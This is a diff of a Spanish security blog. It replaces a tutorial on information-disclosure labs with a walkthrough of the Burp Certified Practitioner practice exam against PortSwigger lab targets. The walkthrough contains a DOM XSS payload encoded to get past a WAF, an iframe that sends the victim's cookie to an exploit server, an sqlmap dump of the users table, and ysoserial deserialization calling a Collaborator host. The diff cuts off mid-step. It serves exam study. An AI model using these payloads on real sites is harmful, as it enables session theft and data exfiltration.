@@ -9,13 +9,13 @@
 
   
 
-  <title>6. Information Disclosure.</title>
+  <title>Burp Certified Practitioner Practice Exam.</title>
 
   
   <meta name="author" content="Qv1nTv5">
   
 
-  <meta name="description" content="Detección y explotación de vulnerabilidades de escapes de información a través de la herramienta BurpSuite.">
+  <meta name="description" content="Practice Exam Burp Certified Practitioner.">
 
   
 
@@ -76,17 +76,17 @@
 
   
   <meta property="og:site_name" content="Home">
-  <meta property="og:title" content="6. Information Disclosure.">
-  <meta property="og:description" content="Detección y explotación de vulnerabilidades de escapes de información a través de la herramienta BurpSuite.">
+  <meta property="og:title" content="Burp Certified Practitioner Practice Exam.">
+  <meta property="og:description" content="Practice Exam Burp Certified Practitioner.">
 
   
 
   
   <meta property="og:type" content="article">
   <meta property="og:article:author" content="Qv1nTv5">
-  <meta property="og:article:published_time" content="2022-03-11T00:00:00-05:00">
-  <meta property="og:url" content="http://localhost:4000/2022-03-11-6.Information_disclosure/">
-  <link rel="canonical" href="http://localhost:4000/2022-03-11-6.Information_disclosure/">
+  <meta property="og:article:published_time" content="2022-03-30T00:00:00-04:00">
+  <meta property="og:url" content="http://localhost:4000/2022-03-30-PracticeExam/">
+  <link rel="canonical" href="http://localhost:4000/2022-03-30-PracticeExam/">
   
 
   
@@ -95,8 +95,8 @@
   <meta name="twitter:site" content="@Qvintvs1">
   <meta name="twitter:creator" content="@Qvintvs1">
 
-  <meta property="twitter:title" content="6. Information Disclosure.">
-  <meta property="twitter:description" content="Detección y explotación de vulnerabilidades de escapes de información a través de la herramienta BurpSuite.">
+  <meta property="twitter:title" content="Burp Certified Practitioner Practice Exam.">
+  <meta property="twitter:description" content="Practice Exam Burp Certified Practitioner.">
 
   
 
@@ -631,15 +631,15 @@
     <div class="row">
       <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
         <div class="post-heading">
-          <h1>6. Information Disclosure.</h1>
+          <h1>Burp Certified Practitioner Practice Exam.</h1>
           
             
-              <h2 class="post-subheading">Detección y explotación de vulnerabilidades de escapes de información a través de la herramienta BurpSuite.</h2>
+              <h2 class="post-subheading">Practice Exam Burp Certified Practitioner.</h2>
             
           
 
           
-            <span class="post-meta">Posted on March 11, 2022</span>
+            <span class="post-meta">Posted on March 30, 2022</span>
             
             
           
@@ -663,414 +663,212 @@
       
 
       <article role="main" class="blog-post">
-        <h2 id="0-índice">0. Índice.</h2>
+        <h1 id="practice-exam">Practice Exam.</h1>
+
+<p>El examen consta de una aplicación con tres vulnerabilidades que deben de ser explotadas secuencialmente con los siguientes propósitos:</p>
+
+<ol>
+  <li>Robar la cuenta de un usuario sin privilegios.</li>
+  <li>Elevar privilegios a la cuenta del administrador.</li>
+  <li>Robar el flag contenido en el fichero /home/carlos/secret del servidor que hostea la aplicación web.</li>
+</ol>
+
+<p>El tiempo límite son dos horas.</p>
+
+<p><br /></p>
+
+<h3 id="vul1-dom-based-xss">Vul1: DOM-based XSS.</h3>
+
+<p>En primer lugar accedemos a la primera aplicación web del examen y nos encontramos con diversas pestañas, home, Admin panel, My account y Advanced search. Dado el hecho de que tenemos un tiempo limitado para resolver esta aplicación no conviene lanzar un escaneo general de la misma. Por el contrario, las pestañas Admin Panel y Advanced Search están vedadas para el nivel de privilegios que tenemos actualmente.</p>
+
+<p>Así, lanzamos un escaneo sobre la barra de búsqueda de la pestaña “home”. Durante el escaneo se nos informa de la existencia de una vulnerabilidad DOM-Based XSS por lo que recurrimos a la herramienta DOM Invader presente por defecto en el navegador asociado a Burp y buscamos el canario TEST obteniendo:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613152414.png" text-align="center" />
+</div>
+
+<p>El input se introduce en un código JavaScript en el que podemos intentar introducir un payload. Así, para comprobarlo, intentamos provocar un “alert()” mediante:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">"</span><span class="s2">,</span><span class="dl">"</span><span class="nx">test</span><span class="dl">"</span><span class="s2">:alert(1)}//
+</span></code></pre></div></div>
+
+<p>Con esto lo que hacemos es cerrar el elemento mediante unas comillas y creamos otro separado por una coma cuyo nombre es “test” y cuyo valor es “alert(1)” y finalmente cerramos la estructura javascript y empleamos dos barras para comentar el resto del código. Da resultado con lo que se puede introducir código JavaScript. Ahora para mayor seguridad intentamos hacer que la página nos enseñe las cookies sin éxito debido a que el término “document.cookie” se bloquea mediante un WAF. Así por lo tanto, para evitar este bloqueo, podemos incluir un término encodeado que desencodeamos en el propio payload:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;ciphertext&gt;</span><span class="dl">"</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Con ‘eval’ provocaremos que el engine ejecute las funciones siguientes que se encuentren dentro del paréntesis. Con ‘atob’ decodificamos un string encodeado en base64. Así, si eval no es un término que se bloque en el navegador y si el servidor no lleva a cabo una validación del código nuestro payload codificado en base 64 se ejecutará en el navegador de la víctima. Para encodear en linux un texto en base64 empleamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"&lt;text&gt;"</span> | <span class="nb">base64</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span>
+</code></pre></div></div>
+
+<p>Así, encodeamos el término “alert(document.cookie)” en base64 y se lo pasamos como argumento a la función compuesta de ‘eval’ y ‘atob’ obteniendo nuestras cookies en el navegador. Ahora sólo queda encontrar la forma de hacer llegar la respuesta envenenada a una víctima.</p>
+
+<p>Para ello vamos a emplear la funcionalidad del “exploit server” del propio examen de práctica, el cual simula un servidor que hostea una página web que podemos modificar a conveniencia para almacenar código javascrip, html, etc y que entre otras cosas posee una funcionalidad, “Deliver exploit to victim” que simula una víctima que ejecuta cualquier enlace que reciba.</p>
+
+<p>De esta forma, construimos el siguiente código javascript:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span><span class="s2">`http://127.0.0.1:8000/?cookie=</span><span class="p">${</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Esto lo que hace es llevar a cabo una request a una dirección arbitraria con su propia cookie como parámetro en la request. Así, si hiciera una request a un servidor bajo nuestro control, podríamos revisarla mediante el log y obtener el valor del parámetro cookie que podríamos utilizar para robar la sesión. En este caso, vamos a emplear la dirección del servidor del exploit aunque se podría hacer con cualquier otro tipo de servidor.</p>
+
+<p>Así, cambiamos la dirección del servidor del envío de la request y lo encodeamos en base64 como hemos visto antes y se lo pasamos a la barra de búsqueda de la aplicación web como argumento de la función compuesta de ‘eval’ y ‘atob’ y le damos a buscar.</p>
+
+<p>Esto tiene dos propósitos:</p>
 
 <ul>
-  <li>1 Introducción.</li>
-  <li>2 Concepto de Information Disclosure.
-    <ul>
-      <li>2.1. Presentación de la vulnerabilidad.</li>
-      <li>2.2. Ejemplos de escapes de información.</li>
-    </ul>
-  </li>
-  <li>
-    <ol>
-      <li>Explotando brechas de información.
-        <ul>
-          <li>3.1. Reglas generales a la hora de testear brechas de información.</li>
-        </ul>
-        <ul>
-          <li>3.1.1. Fuzzing.</li>
-          <li>3.1.2. Usar herramientas de engagement de burp.</li>
-          <li>3.1.3. Obteniendo información via Ingienieria informática.
-    - 3.2. Fuentes comúnes de brechas de información.</li>
-          <li>3.2.1. Ficheros guía para buscadores web.</li>
-          <li>3.2.2. Listado de directorios.</li>
-          <li>3.2.3. Mensajes de error.</li>
-          <li>3.2.4. Debuggin data.</li>
-          <li>3.2.5. Páginas de cuentas de usuarios.</li>
-          <li>3.2.6. Difusión del código fuente mediante archivos de backups.</li>
-          <li>3.2.7. Brechas de información debido a una configuración insegura.</li>
-          <li>
-            <p>3.2.8. Historial de control de versiones.</p>
-
-            <p><br /></p>
-          </li>
-        </ul>
-      </li>
-    </ol>
-  </li>
+  <li>Comporobar que el payload funciona antes de utilizarlo comprobando que en log del servidor de exploit del examen aparece una entrada con nuestra cookie:</li>
 </ul>
 
-<h3 id="1-introducción">1. Introducción.</h3>
-
-<p>En esta sección explicaremos los conceptos básicos accerca de Information Disclosure Vulnerabililties.</p>
-
-<p><br /></p>
-
-<h3 id="2-concepto-de-information-disclosure">2. Concepto de Information Disclosure.</h3>
-
-<h4 id="21-presentación-de-la-vulnerabilidad">2.1. Presentación de la vulnerabilidad.</h4>
-<p>Information Disclosure (fallas de información) es una debilidad de una página a través de la cual <strong>un sitio web deja expuesto información sensible inintencionadamente</strong> que posteriormente puede escalar a vulnerabilidad.</p>
-
-<p>Por información sensible a su vez entendemos:</p>
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613155602.png" text-align="center" />
+</div>
 
 <ul>
-  <li>Datos acerca de otros usuarios.</li>
-  <li>Información comercial o del negocio.</li>
-  <li>Detalles técnicos acerca de la infraestructura del sitio web.</li>
+  <li>Obtener una URL correctamente encodeada en la barra de navegación que utilizaremos en el servidor del exploit para construir un enlace que provoque que la víctima al ejecutarlo realice una request con el payload malicioso al servidor de la aplicación vulnerable y carge la respuesta maliciosa en una página haciendo así que el navegador de la víctima ejecute nuestro código javascript.</li>
 </ul>
 
-<p>Evidentemente, los peligros de esta debilidad son obvios dado que la exposición de información puede conducir a un punto de partida para confeccionar un ataque.</p>
+<p>Esto lo conseguimos mediante la etiqueta html “iframe”:</p>
 
-<p>En algunas ocasiones, los leaks de información se producen de manera causal por algunos usuarios que hacen un uso normal de la aplicación aunque <strong>la mayoría de las veces son producidos por atacantes que se comportan de manera maliciosa para inducir un comportamiento erróneo en la aplicación web</strong>.</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://ac061f641f7fd41cc13e69b7005b00cd.web-security-academy.net/?SearchTerm=%22%2C%22test%22%3Aeval%28atob%28%22dmFyIHhtbGh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTt4bWxodHRwLm9wZW4oIkdFVCIsYGh0dHBzOi8vZXhwbG9pdC1hYzRkMWY1NzFmMjlkNDJiYzFlODY5MDMwMWVkMDBhNy53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQvP2Nvb2tpZT0ke2RvY3VtZW50LmNvb2tpZX1gLGZhbHNlKTt4bWxodHRwLnNlbmQobnVsbCk7Cg%3D%3D%22%29%29%7D%2F%2F"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<p>Esto será lo que colocaremos en la sección “Body” del servidor del exploit. Así, al pulsar el botón “Deliver exploit to victim” el examen simulará una víctima que recibirá un enlace que realizará una request via la URL maliciosa (el marco iframe incluye en la página el código html que se incluye en el atributo src de la propia etiqueta) que provocará la ejecución de javascript malicioso proporcionándonos su cookie:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613160126.png" text-align="center" />
+</div>
+
+<p>Esta es la cookie de la víctima y con ella podemos usurpar su sesión cambiando el valor de nuestra cookie de sesión por la suya en nuestro navegador si podemos o en una request al servidor web. Así:</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220613160313.png" text-align="center" />
+</div>
+
+<p>Como el navegador Chromium de Burp no vuelve permanente el cambio de cookie y tenemos acceso a la contraseña del usuario, copiaremos la contraseña (inspeccionar elemento) y nos logearemos como Carlos para no perder la sesión al mandar otra request al navegador. Así, habríamos terminado la primera vulnerabilidad.</p>
 
 <p><br /></p>
 
-<h4 id="22-ejemplos-de-escapes-de-información">2.2. Ejemplos de escapes de información.</h4>
+<h3 id="vul2-sql-injection">Vul2: SQL-injection.</h3>
 
-<p>Algunos ejemplos básicos serían:</p>
+<p>Con la ganancia de una sesión también ganamos acceso al apartado “Advanced search” cuyo contenido antes nos estaba vedado. Con ello, volvemos a lanzar el escaner y se nos informa de una posible vulnerabilidad de SQL injection.</p>
+
+<p>Para asegurarnos lanzamos la herramienta SQLmap mediante el siguiente comando:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"https://ac061f641f7fd41cc13e69b7005b00cd.web-security-academy.net/filtered_search?SearchTerm=&amp;sort-by=DATE&amp;writer="</span> <span class="nt">-p</span> sort-by <span class="nt">--cookie</span><span class="o">=</span><span class="s2">"_lab=47%7cMC0CFQCHJrZsNthVcY5jbqKhcRpKhgVdVwIUMIZQ4muX7QKzsAVvPjRpaUaH%2f%2b%2bDKS5S0rIote%2bD3AN7%2bPPeWMJI9cNcxcnDrBzfGzs%2fxH3Yvd%2bqidgg9tXa8ux8G6PLZzytbXtTBwCnjaSsNR%2bWhzeFgh7lljzg5iDsdVBKZ6pcOLDa; session=MDlRetGK13F5XKQzKf2wEJ6Nh7WXjcO6"</span> <span class="nt">--dbs</span>
+</code></pre></div></div>
+
+<p>Con ello empleamos sqlmap que realiza un fuzzeo mediante el envío de muchas request con los siguientes modificadores:</p>
 
 <ul>
+  <li><strong>-u</strong>: Para aportar la URL con los parámetros adecuados.</li>
+  <li><strong>-p</strong>: Para aportar el parámetro a testear, por defecto se testean todos pero el escaner de burp nos informa concretamente del término “sort-by”</li>
   <li>
-    <p>Revelar nombres de directorios ocultos, su estructura, a través de robots.txt. (Este es un fichero que guía a los recolectores de información de internet buscadores como google, bing, etc. Les orienta sobre qué directorios/ficheros de un sitio web pueden recolectar y cuales no).</p>
+    <p><strong>–cookie=</strong>: Para aportar las cookies de sesión, ya que como esta funcionalidad sólo está disponible para determindos usuarios, si no mandamos la sesión las request que mande sqlmap serán bloqueadas por el servidor web.</p>
   </li>
-  <li>
-    <p>Proporcionar acceso a archivos de código fuente a través de copias de seguridad.</p>
-  </li>
-  <li>
-    <p>Explícitamente mencionar una tabla de base de datos o alguna de sus columnas en errores de mensajes.</p>
-  </li>
-  <li>
-    <p>Información personal de otros usuarios.</p>
-  </li>
-  <li>
-    <p>Información sensible en el código fuente, como direcciones IP, credenciales de bases de datos, etc.</p>
-  </li>
-  <li>
-    <p>Cambios de comportamiento en la aplicación ante determinados contextos que puedan dar pistas sobre la existencia de falta de recursos en la misma.</p>
-  </li>
+  <li><strong>–dbs</strong>: Para obtener todas las bases de datos.</li>
 </ul>
 
-<p><br /></p>
-
-<h4 id="23-planteamiento-de-brechas-de-información">2.3. Planteamiento de brechas de información.</h4>
-
-<p>Las brechas de información pueden plantearse de incontables maneras, pero podemos generalizar una serie de prototipos:</p>
-
-<ul>
-  <li>
-    <p><strong>Fallo en quitar el contenido interno del contenido público</strong>. Por ejemplo, comentarios que no se quitan del entorno de producción que proveen pistas de la estructura del código fuente.</p>
-  </li>
-  <li>
-    <p><strong>Configuración insegura del sitio web y tecnologías relacionadas</strong>. Por ejemplo, no deshabilitar el debuggin o características de diagnostico pueden ayudar a un posible atacante a obtener información sensible del sitio web.</p>
-  </li>
-</ul>
-
-<p>También, la configuración por defecto puede hacer que el sitio sea vulnerable (error verbosing, default credentials, etc).</p>
-
-<ul>
-  <li><strong>Defectos en el diseño del comportamiento de la aplicación</strong>. Como por ejemplo ver si un sitio web devuelve distintas respuestas cuando se plantean distintos estados error, por ejemplo, cuando introduces mal el nombre y la contraseña vs cuando introduces bien el nombre y mal la contraseña. Esto podría permitir a un hipotético atacante hacer una enumeración de información sensible.</li>
-</ul>
-
-<p><br /></p>
-
-<h3 id="3-explotando-brechas-de-información">3. Explotando brechas de información.</h3>
-
-<p>En este apartado explicaremos cómo identificar brechas de información mediante una serie de reglas y herramientas.</p>
-
-<p><br /></p>
-
-<h4 id="31-reglas-generales-a-la-hora-de-testear-brechas-de-información">3.1. Reglas generales a la hora de testear brechas de información.</h4>
-
-<p>Dada la gran variedad de formas en las que se puede producir una brecha de información es importante no centrarse en un punto en concreto.</p>
-
-<p>Los siguientes constituyen una serie de ejemplos de cómo se puede filtrar cierta información y de cómo podemos aprovechar esa información para perjudicar a la empresa.</p>
-
-<p><br /></p>
-
-<h5 id="311-fuzzing">3.1.1. Fuzzing.</h5>
-
-<p>El <strong>fuzzing</strong> es el proceso de introducir input extraño en determinados parámetros de la aplicación web para comprobar la forma en la que esta reacciona a la introducción de este input.</p>
-
-<p>En esta clase de tretas hace falta poner mucha atención debido a que la alteración del comportamiento de la web puede ser algo muy explícito como un cambio en el contenido de la respuesta http pero también puede ser algo muy sutil como un pequeño retraso en la entrega de la respuesta por parte del servidor.</p>
-
-<p>Para este proceso Burp Intruder** es muy útil debido a que con él se puede automatizar el mecanismo obteniendo los siguietnes beneficios:</p>
-
-<ul>
-  <li>Agregar payloads y posiciones.</li>
-  <li>Identificar rápidamente cambbios en las respuetas http.</li>
-  <li>Utilizar herramientas de rastreo de un patrón o keyword en la respuesta http.</li>
-</ul>
-
-<p><br /></p>
-
-<h5 id="312-usar-herramientas-de-engagement-de-burp">3.1.2. Usar herramientas de engagement de burp.</h5>
-
-<p>Burp provee una serie de herramientas de engagement que se pueden utilizar para encontrar información interesante acerca del sitio web objetivo de una manera más fácil.</p>
-
-<p>Sencillamente, pulsando el botón derecho sobre cualquier request, sitio o elemento perteneciente a la aplicación web identificado por BurpSuite y le damos a “Engagement tools” disponible sólo en la versión Pro, de pago.</p>
+<p>Después de realizar los ajustes adecuados se nos informa de que efectivamente el término “sort-by” es un punto de inyección y además podemos ver que está basado en times-delays:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220408215041.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613161249.png" text-align="center" />
 </div>
 
-<p><br /></p>
+<p>Así, termina diciendonos que hay una base de datos que se llama ‘public’, de forma que, seguimos profundizando y en el comando anterior cambiamos <strong>–dbs</strong> por <strong>-D public –tables</strong> para recuperar todas las tablas de la base de datos ‘public’.</p>
 
-<h5 id="313-obteniendo-información-via-ingienieria-informática">3.1.3. Obteniendo información via Ingienieria informática.</h5>
+<p>Nos informa de que existen tres tablas: comments, posts y users. Evidentemente, nos interesa la tabla ‘users’. Así, nos disponemos a sacar el contenido de dicha tabla mediante <strong>-D public -T users –dump</strong> en lugar de <strong>-D public –tables</strong>.</p>
 
-<p>Los mensajes de error detallados a veces pueden revelar información interesante mientras realiza su flujo de trabajo de prueba normal. Sin embargo, al estudiar la forma en que los mensajes de error cambian según su entrada, puede llevar esto un paso más allá. En algunos casos, podrá manipular el sitio web para extraer datos arbitrarios a través de un mensaje de error.</p>
-
-<p>Existen numerosos métodos para hacer esto dependiendo del escenario particular que encuentre. Un ejemplo común es hacer que la lógica de la aplicación intente una acción no válida en un elemento de datos específico.</p>
-
-<p><br /></p>
-
-<h4 id="32-fuentes-comúnes-de-brechas-de-información">3.2. Fuentes comúnes de brechas de información.</h4>
-
-<h5 id="321-ficheros-guía-para-buscadores-web">3.2.1. Ficheros guía para buscadores web.</h5>
-
-<p>Muchos sitios web proveen ficheros como <strong>/robots.txt</strong> o <strong>/sitemap.xml</strong> que ayuda a los buscadores web a localizar o navegar su sitio web.</p>
-
-<p>Entre otras cosas, estos directorios web ofrecen una lista de aquellos directorios/ficheros que tales buscadores web deberían omitir porque, por ejemplo, pueden tener información sensible.</p>
-
-<p>Pueden no aparecer inmediatamente en “Burp’s site map”, pero siempre merece la pena intentar navegar a /robots.txt o /sitemap.xml manualmente para ver si se encuentra algo útil.</p>
-
-<p><br /></p>
-
-<h5 id="322-listado-de-directorios">3.2.2. Listado de directorios.</h5>
-
-<p>Los servidores web pueden ser configurados para listar automáticamente los contenidos de los directorios no indexados. Esto particularmente aumenta la exposición de ficheros con información sensible dentro de directorios que no se tiene intención de mostrar al público. Puede guiar a un atacante para atacar recursos específicos de la página web.</p>
-
-<p>Conviene mencionar que esto no es intrinsecamente una vulnerabilidad pero si además la página web no pone controles de acceso adecuados, esta debilidad si puede transformarse en una vulnerabilidad que un atacante podría utilizar a su favor.</p>
-
-<p><br /></p>
-
-<h5 id="323-mensajes-de-error">3.2.3. Mensajes de error.</h5>
-
-<p>Una de las partes entre las que más se suele producir escapes de información es a través de los mensajes de error.</p>
-
-<p>Hemos visto en laboratorios anteriores que los mensajes de error nos permiten obtener conocimiento acerca de la estructura de una búsqueda SQL, de cuándo un nombre de usuario existe, etc.</p>
-
-<p><br /></p>
-
-<p><strong>Laboratorio 1: Information disclosure in error messages</strong>.</p>
-
-<p>Este laboratorio tiene una falla consistente en una mala gestión de los mensajes de error que despliega cuando se introduce en algún parámetro un tipo de dato no esperado por el servidor.</p>
-
-<p>Por ejemplo, si en la tienda online le damos a inspeccionar detalles de un producto de la tienda:</p>
+<p>Finalmente obtenemos:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220410175246.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613163240.png" text-align="center" />
 </div>
 
-<p>E interceptamos la request con el Proxy vemos que existe un parámetro que acepta valores numéricos:</p>
+<p>Así, nos logeamos a la cuenta del administrador.
+<br /></p>
+
+<h3 id="vul3-java-deserialization">Vul3: Java Deserialization.</h3>
+
+<p>Con la ganancia de las nuevas credenciales hemos ganado acceso a una nueva parte de la aplicación web que es el “Admin panel”. Al revisar las cookies podemos observar que tenemos una cookie: admin_pref.</p>
+
+<p>En el escaner obtenemos que se trata de una vulnerabilidad de objeto serializado de Java:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220410175820.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613164533.png" text-align="center" />
 </div>
 
-<p>Le cambiamos el valor por un string y enviamos la request:</p>
+<p>Para verificarlo empleamos el auto-decodificador online: “CyberChef” y observamos que secuencialmente lo decodifica de URL &gt; Base64 &gt; GZip.</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220410175837.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613163510.png" text-align="center" />
 </div>
 
-<p>Obtenemos el siguiente mensaje de error por aprte de la página:</p>
+<p>Así, lo llevamos al decodificador de BurpSuite para intentar ver su contenido decodificándolo en URL &gt; Base64 y Gzip:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220410175922.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613163621.png" text-align="center" />
 </div>
 
-<p>Así, hemos obtenido la versión del servidor web.</p>
-
-<p><br /></p>
-
-<h5 id="324-debuggin-data">3.2.4. Debuggin data.</h5>
-
-<p>Muchos sitios webs generan mensajes de error y logs en la depuración (debug) de su código que contienen mucha información sobre el comportamiento de la aplicación que evidentemente pueden ser útiles en una etapa de desarrollo pero que resultan muy perjudiciales en las manos equivocadas.</p>
-
-<p>Esto es especialmente grave cuando la página que contiene esta información se encuentra adherida al entorno de produccción, es decir, en algún lado de la página web. Veamos un laboratorio para entenderlo mejor.</p>
-
-<p><br /></p>
-
-<p><strong>Laboratorio 2: Information disclosure on debug page</strong>.</p>
-
-<p>Este laboratorio contiene una página con información sobre la depuración de datos que puede contener información sensible sobre el sitio web.</p>
-
-<p>En primer lugar, nos introducimos en el laboratorio y no observamos nada raro salvo un comentario en el documneto HTML que puede ser visto desde Inspeccionar el código fuente:</p>
+<p>Podemos observar que se trata de un objeto serializado de Java. Para explotar esta vulnerabilidad vamos a emplear la herramienta “Java Deserialization Scanner” disponible desde Extender &gt; BAppStore en burpsuite. Para configurarlo necesitamos además Ysoserial disponible desde el enlace: https://github.com/frohoff/ysoserial del cual tenemos que descargarnos el JitPack. Una vez descargado debemos condigurar el path para Burp:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220429192106.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613163916.png" text-align="center" />
 </div>
 
-<p>En él se puede encontrar la dirección del fichero /cgi-bin/phpinfo.php. Así, acudiendo a dicha dirección obtenemos:</p>
+<p>De esta forma, capturamos una request que contenga dicha cookie y lo enviamos al Deserialization Scanner:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220429192217.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613164032.png" text-align="center" />
 </div>
 
-<p>Podemos observar mucha información de configuración, del sistema, del servidor, etc que podría resultar útil a un atacante que quisiera perpretar un ataque para comprometer el sistema.</p>
-
-<p>Entre otras cosas, la SECRET_KEY necesaria para terminar el laboratorio:</p>
+<p>Primero llevamos a cabo un “Manual testing”, seteamos el “Set Insertion point” subrayando la cookie de admin_pref</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220429192448.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613164632.png" text-align="center" />
 </div>
 
-<p><br /></p>
-
-<h5 id="325-páginas-de-cuentas-de-usuarios">3.2.5. Páginas de cuentas de usuarios.</h5>
-
-<p>Lás páginas de cuentas de usuarios contienen, normalmente, información sensible del usuario propietario de la página, tales como información de contacto, información personal, información bancaria, etc.</p>
-
-<p>Muchas páginas webs contienen fallas lógicas que permiten a un atacante escalar hasta tales páginas permitiéndoles acceder a toda esa información del usuario.</p>
-
-<p>Ejemplos de esto podrá verse en el siguiente topic <strong>Access Control</strong>.</p>
-
-<p><br /></p>
-
-<h5 id="326-difusión-del-código-fuente-mediante-archivos-de-backups">3.2.6. Difusión del código fuente mediante archivos de backups.</h5>
-
-<p>Un atacante que tenga en su poder el código fuente de la aplicación puede entender mucho más fácilmente el comportamiento de la misma lo que puede acortar el tiempo de preparación de un posible ataque.</p>
-
-<p>Muchas veces, existen ficheros dentro del sistemas de ficheros del sitio web que contienen información del código fuente de la propia web y están completamente expuestos para cualquiera que realice un mapeado de la página web con una herramienta de escaneo como ‘dirb’.</p>
-
-<p><br /></p>
-
-<p><strong>Laboratorio 3: Source code disclosure via backup files</strong>.</p>
-
-<p>Este laboratorio filtra su código fu
-ente mediante ficheros de backup en un directorio oculto.</p>
-
-<p>En primer lugar, acudimos al laboratorio y utilizamos la herramienta “Site map” en la pestaña “Target” de burp tras haber interceptado una request del sitio. En el mapeo, tras un rato, podremos obtener un directorio con el nombre “backup”:</p>
+<p>Y seguidamente ponemos que es un objeto comprimido en gzip, que luego se encodea en base64 y luego en URL:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220429193545.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613164702.png" text-align="center" />
 </div>
 
-<p>Al acudir a dicha dirección nos encontramos con un fichero .java.bak, de los backups:</p>
+<p>Los resultados que aparecen a la izquierda nos informa de posibles vulnerabilidades:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220429193637.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613164738.png" text-align="center" />
 </div>
 
-<p>Que contieen información acerca de la base de datos del sitio web, entre otras cosas, la contraseña:</p>
+<p>En Apache CommonsCollections3.</p>
+
+<p>Así, vamos a la pestaña exploiting de la propia herramienta y repetimos los pasos: Configuramos la cookie como punto de inyección y seteamos la secuencia de codificación GZip &gt; Base64 &gt; URL.</p>
+
+<p>En esta pestaña podremos emplear el payload a enviar a través de Ysoserial definiendo el tipo de objeto (CommonsCollection1, 2, etc) y el comando a ejecutar. En este caso, para estar seguros de que el payload se ejcuta vamos a intentar hacer una conexión con un sistema bajo nuestro control, esto es, un host con BurpCollaborator para asegurarnos de que se ejecuta nuestro payload:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220429193740.png" text-align="center" />
+	<img src="/assets/img/Burp/Pasted%20image%2020220613165116.png" text-align="center" />
 </div>
 
-<p>Y con esto habríamos terminado el laboratorio.</p>
-
-<p><br /></p>
-
-<h5 id="327-brechas-de-información-debido-a-una-configuración-insegura">3.2.7. Brechas de información debido a una configuración insegura.</h5>
-
-<p>Los sitios web a veces son vulnerables como resultado de una configuración incorrecta. Esto es especialmente común debido al uso generalizado de tecnologías de terceros, cuya amplia gama de opciones de configuración no necesariamente son bien comprendidas por quienes las implementan.</p>
-
-<p>En algunos casos puede ocurrir que incluso los desarrolladores del sitio web se olviden de deshabilitar ciertas opciones de depuración de código generando así fallas.</p>
-
-<p><br /></p>
-
-<p><strong>Laboratorio 4: Authentication bypass via information disclosure</strong>.</p>
-
-<p>La interfaz de administración de este laboratorio tiene una vulnerabilidad de omisión de autenticación, pero no es práctico explotarla sin el conocimiento de un encabezado HTTP personalizado utilizado por el front-end.</p>
-
-<p>Para resolver el laboratorio, obtenga el nombre del encabezado y luego utilícelo para omitir la autenticación del laboratorio. Acceda a la interfaz de administración y elimine la cuenta de Carlos. Puede iniciar sesión en su propia cuenta con las siguientes credenciales: wiener:peter</p>
-
-<p>En primer lugar, llevamos a cabo una request al apartado /admin de forma que nos aparece un mensaje de error.</p>
+<p>Al probarlo con CommonsCollections1 no funciona, seguimos probando hasta el CommonsCollection6, entonces:</p>
 
 <div style="text-align:center">
-	<img src="/assets/img/Burp/Pasted%20image%2020220414200445.png" text-align="center" />
